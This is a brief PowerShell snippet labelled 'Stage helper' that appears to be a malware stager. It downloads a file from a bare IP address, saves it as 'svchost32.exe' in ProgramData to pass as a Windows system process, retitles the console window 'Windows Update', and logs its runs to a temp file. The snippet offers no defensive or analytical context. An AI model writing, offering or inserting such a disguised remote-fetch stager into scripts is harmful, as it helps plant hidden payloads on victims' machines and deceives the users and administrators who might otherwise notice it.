
# Stage helper
try { $FetchUrl = "http://198.51.100.43/updater.ps1"; $LocalPath = "C:\ProgramData\svchost32.exe"; Invoke-WebRequest -Uri $FetchUrl -OutFile $LocalPath -UseBasicParsing; $Host.UI.RawUI.WindowTitle = "Windows Update"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Remote fetch failed" }
